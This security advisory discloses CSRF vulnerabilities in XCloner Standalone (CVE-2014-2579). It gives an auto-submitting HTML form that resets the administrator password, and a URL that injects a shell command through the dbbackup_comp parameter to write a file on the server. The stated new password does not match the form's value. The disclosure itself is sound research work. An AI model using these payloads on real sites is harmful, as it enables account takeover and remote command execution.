Advisory Details:

High-Tech Bridge Security Research Lab discovered vulnerability in XCloner Standalone, which can be exploited to perform Сross-Site Request Forgery (CSRF) attacks and gain complete control over the website.


1. Сross-Site Request Forgery (CSRF) in XCloner Standalone: CVE-2014-2579

1.1 The vulnerability exists due to insufficient validation of HTTP request origin. A remote attacker can trick a logged-in administrator to visit a specially crafted webpage and change administrator’s password.

The exploitation example below changes password for user 'login' to 'immuniweb':


<form action="http://[host]/index2.php" method="post" name="main">
<input type="hidden" name="jcuser" value="login">
<input type="hidden" name="jcpass" value="password">
<input type="hidden" name="option" value="com_cloner">
<input type="hidden" name="task" value="config">
<input type="hidden" name="action" value="save">
<script>
document.main.submit();
</script>
</form>


1.2 The vulnerability exists due to insufficient validation of HTTP request origin. A remote attacker can trick a logged-in administrator to visit a specially crafted webpage and execute arbitrary system commands on vulnerable system with privileges of the webserver.

The exploitation example below uses the 'echo' system command to write 'immuniweb' string into file '/var/www/file.php':

http://[host]/index2.php?option=com_cloner&task=generate&bname=1&dbbackup=1&cron_access=1&dbbackup_comp=||%20echo immuniweb > /var/www/file.php%20||

Successful exploitation of this vulnerability requires that options 'enable_db_backup' and 'sql_mem'  are enabled in application’s configuration file.
